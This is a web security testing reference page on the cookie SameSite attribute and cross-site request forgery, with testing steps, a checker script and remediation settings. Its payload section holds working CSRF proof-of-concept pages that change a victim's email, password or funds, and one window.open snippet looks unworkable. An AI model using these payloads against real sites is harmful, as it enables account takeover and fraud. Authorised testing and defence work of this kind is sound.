# Cookie SameSite Attribute

## Overview
The `SameSite` cookie attribute controls whether a cookie is sent with cross-site requests, providing a powerful defense against Cross-Site Request Forgery (CSRF) and some types of cross-site information leakage. When `SameSite` is absent or set to `None`, cookies are sent with all cross-origin requests, enabling CSRF attacks where a malicious page tricks a victim's browser into making authenticated requests to the target application. Modern browsers have begun defaulting to `SameSite=Lax`, but many applications still explicitly set `SameSite=None` for legacy compatibility, or run in contexts where default behavior cannot be relied upon.

## How It Works
- `SameSite=Strict`: Cookie is only sent with requests originating from the same site as the cookie's origin. Cross-site navigation does not include the cookie.
- `SameSite=Lax`: Cookie is sent with same-site requests AND top-level navigation GET requests (e.g., clicking a link). Not sent with cross-site POST, iframe, img, fetch requests.
- `SameSite=None`: Cookie is sent with ALL requests regardless of origin. REQUIRES the `Secure` flag. Enables CSRF.
- Without `SameSite`: Older browsers default to `None`; newer browsers (Chrome 80+) default to `Lax` — but this cannot be relied upon for security.
- `Lax` can still be bypassed for GET-based state-changing actions or with specific 302-redirect techniques.

## Impact
- CSRF attacks that perform unauthorized actions on behalf of authenticated users.
- State-changing actions (fund transfers, password changes, email changes, account deletions) triggered from attacker-controlled pages.
- Cross-site information leakage via timing attacks or cross-origin resource inclusion.
- Bypasses CSRF token protection if the token itself is in a `SameSite=None` cookie.
- Particularly dangerous in APIs consumed by multiple clients — `SameSite=None` is common in API contexts.

## Where to Look
- All `Set-Cookie` response headers — check the `SameSite` attribute value.
- Login, registration, and session renewal responses.
- Cookies set by third-party integrations (OAuth callbacks, payment widgets, SSO).
- API endpoints that are also accessed by browser clients.
- Cross-origin requests in SPA (Single Page Application) architectures.
- Any cookie with `SameSite=None` — verify it is absolutely necessary and has `Secure`.

## Testing Steps
1. Log in and capture the `Set-Cookie` response header in Burp Suite.
2. Identify the `SameSite` value: `Strict`, `Lax`, `None`, or absent.
3. If `SameSite=None` or absent: attempt a CSRF attack (see CSRF testing methodology).
4. For `SameSite=Lax` bypass: look for state-changing GET endpoints (e.g., `GET /delete-account?confirm=yes`).
5. Test the `Lax` bypass via top-level navigation: create an HTML page on your server with `<a href="https://target.com/change-email?email=attacker@evil.com">click</a>` and test if the session cookie is sent.
6. Test the 302 redirect bypass for `Lax`: if a POST to a third-party site triggers a 302 redirect to target.com POST, the `Lax` cookie may still be sent on some browsers.
7. In browser DevTools > Network: filter for requests to `target.com` originating from your attacker page and inspect the `Cookie` request header.
8. Use the browser DevTools > Application > Cookies panel to see the SameSite value visually.
9. Verify that `SameSite=None` cookies also have the `Secure` flag (required by spec and modern browsers).
10. Test in multiple browsers — Safari, Firefox, Chrome — as SameSite defaults differ.

## Payloads / Techniques

```bash
# Check SameSite attribute via curl
curl -si https://target.com/login -X POST \
  -d "username=test&password=Test1234!" | grep -i "set-cookie"

# Vulnerable examples:
# Set-Cookie: session=abc; HttpOnly; Secure; SameSite=None   <-- CSRF possible
# Set-Cookie: session=abc; HttpOnly; Secure                  <-- defaults vary by browser
# Secure example:
# Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
```

```html
<!-- CSRF PoC for SameSite=None or absent session cookie -->
<!-- Host this on your attacker server -->
<!DOCTYPE html>
<html>
<body>
  <h1>CSRF Test</h1>
  <form id="csrf_form" action="https://target.com/account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.getElementById("csrf_form").submit();</script>
</body>
</html>
```

```html
<!-- SameSite=Lax bypass via top-level GET navigation -->
<!-- Works for GET-based state changes -->
<a href="https://target.com/api/transfer?to=attacker&amount=1000">Click me!</a>

<!-- Auto-navigate version -->
<script>
window.location = "https://target.com/api/delete-account?confirm=true";
</script>
```

```html
<!-- SameSite=Lax bypass via window.open + POST (legacy browsers) -->
<script>
var w = window.open("https://target.com");
setTimeout(function() {
  var form = w.document.createElement("form");
  form.method = "POST";
  form.action = "https://target.com/change-password";
  var inp = w.document.createElement("input");
  inp.name = "password";
  inp.value = "hacked123";
  form.appendChild(inp);
  w.document.body.appendChild(form);
  form.submit();
}, 1000);
</script>
```

```python
import requests

def check_samesite(url, method="GET", data=None):
    r = requests.request(method, url, data=data, allow_redirects=True)
    raw_cookies = r.raw.headers.getlist("Set-Cookie")
    for cookie_str in raw_cookies:
        parts = [p.strip().lower() for p in cookie_str.split(";")]
        name = cookie_str.split("=")[0].strip()
        samesite = next((p for p in parts if p.startswith("samesite")), None)
        secure = "secure" in parts
        
        if samesite is None:
            print(f"[!] Cookie '{name}': SameSite NOT SET (browser default behavior)")
        elif "none" in samesite:
            if not secure:
                print(f"[CRITICAL] Cookie '{name}': SameSite=None WITHOUT Secure flag!")
            else:
                print(f"[WARN] Cookie '{name}': SameSite=None (CSRF possible via cross-site requests)")
        elif "lax" in samesite:
            print(f"[INFO] Cookie '{name}': SameSite=Lax (partial protection, check GET state changes)")
        elif "strict" in samesite:
            print(f"[OK] Cookie '{name}': SameSite=Strict (best protection)")

check_samesite("https://target.com/login", "POST",
               {"username": "test", "password": "Test1234!"})
```

## Burp Suite Tips
- **Passive Scanner**: Burp flags `SameSite=None` and absent SameSite values in passive scan issues.
- **CSRF PoC Generator**: When you find a CSRF-vulnerable endpoint (confirmed via SameSite=None/absent), right-click the request in Proxy > "Generate CSRF PoC" — Burp creates an HTML form ready to paste into your test page.
- **Engagement Tools**: Use "Find CSRF tokens" under Target > Engagement tools to identify which forms include CSRF tokens and which do not.
- **Match & Replace**: Add a rule to strip `SameSite=Strict` from Set-Cookie responses to your own browser, then test whether the application has other CSRF protections in place beyond SameSite.
- **Logger++ Extension**: Log all Set-Cookie headers and filter by SameSite attribute value for a comprehensive overview across the entire application.

## Tools
- **Burp Suite** — CSRF PoC generation, passive scanning, SameSite detection.
- **OWASP ZAP** — CSRF scanner and SameSite attribute checking.
- **csrf-poc-generator** (standalone) — generates HTML CSRF PoC pages.
- **SameSite checker (browser extension)** — visualizes SameSite status in browser.
- **curl** — header inspection from command line.
- **Caido** — modern alternative proxy with cookie inspection.

## Remediation
- Set `SameSite=Strict` on all session cookies where cross-site access is not required: `Set-Cookie: session=value; HttpOnly; Secure; SameSite=Strict; Path=/`
- Use `SameSite=Lax` as a minimum for any cookies required by OAuth or other cross-site flows.
- Only use `SameSite=None; Secure` for cookies that genuinely require cross-site transmission (embedded widgets, third-party APIs) — never for session or CSRF tokens.
- Implement CSRF tokens as a defense-in-depth measure alongside SameSite (do not rely on SameSite alone as browsers may differ).
- Avoid state-changing GET endpoints — all mutations should use POST/PUT/PATCH/DELETE.
- Framework defaults:
  - **Django**: `SESSION_COOKIE_SAMESITE = "Strict"` in settings.py
  - **Express.js**: `res.cookie("session", val, { sameSite: "strict" })`
  - **Spring Boot**: `server.servlet.session.cookie.same-site=strict`
  - **PHP 7.3+**: `session_set_cookie_params(["samesite" => "Strict"])`

## References
https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite_attribute
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
https://owasp.org/www-community/SameSite
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#samesite-cookie-attribute
https://web.dev/samesite-cookies-explained/
https://caniuse.com/same-site-cookie-attribute
